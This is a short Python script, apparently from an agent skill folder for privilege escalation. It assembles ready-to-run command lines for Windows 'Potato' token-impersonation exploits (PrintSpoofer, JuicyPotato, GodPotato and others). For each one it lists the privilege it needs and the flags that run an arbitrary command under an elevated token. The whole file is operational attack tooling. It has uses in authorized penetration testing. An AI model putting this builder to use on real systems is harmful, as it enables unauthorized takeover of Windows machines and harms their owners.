#!/usr/bin/env python3
"""Build Potato-family privilege escalation command lines and requirement notes.

Usage:
  python skills/privesc/scripts/potato_launcher.py --potato godpotato --binary C:\\Tools\\GodPotato.exe --command "cmd /c whoami"
"""

from __future__ import annotations

import argparse
import json


REQUIREMENTS = {
    "printspoofer": "Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.",
    "juicypotato": "Requires COM CLSID and SeImpersonatePrivilege on vulnerable OS versions.",
    "godpotato": "Requires SeImpersonatePrivilege; modern potato path.",
    "rottenpotatong": "Requires SeImpersonatePrivilege and local NT AUTHORITY token abuse path.",
    "sweetpotato": "Requires token privilege and matching exploit mode for target build.",
    "roguepotato": "Requires SeImpersonatePrivilege and redirector/listener setup.",
}


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Potato command builder.")
    parser.add_argument(
        "--potato",
        required=True,
        choices=[
            "printspoofer",
            "juicypotato",
            "godpotato",
            "rottenpotatong",
            "sweetpotato",
            "roguepotato",
        ],
    )
    parser.add_argument(
        "--binary", required=True, help="Path to selected potato binary"
    )
    parser.add_argument(
        "--command", required=True, help="Command to execute as elevated token"
    )
    parser.add_argument("--clsid", help="Required for JuicyPotato")
    return parser.parse_args()


def build_command(args: argparse.Namespace) -> str:
    if args.potato == "printspoofer":
        return f'{args.binary} -c "{args.command}"'
    if args.potato == "juicypotato":
        clsid = args.clsid or "<CLSID_REQUIRED>"
        return (
            f'{args.binary} -l 1337 -p "cmd.exe" -a "/c {args.command}" -t * -c {clsid}'
        )
    if args.potato == "godpotato":
        return f'{args.binary} -cmd "{args.command}"'
    if args.potato == "rottenpotatong":
        return f'{args.binary} -cmd "{args.command}"'
    if args.potato == "sweetpotato":
        return f'{args.binary} -p "{args.command}"'
    return f'{args.binary} -r 127.0.0.1 -e "{args.command}"'


def main() -> int:
    args = parse_args()
    command = build_command(args)
    payload = {
        "potato": args.potato,
        "binary": args.binary,
        "command": command,
        "clsid_required": args.potato == "juicypotato",
        "clsid": args.clsid,
        "token_requirements": REQUIREMENTS[args.potato],
    }
    print(command)
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
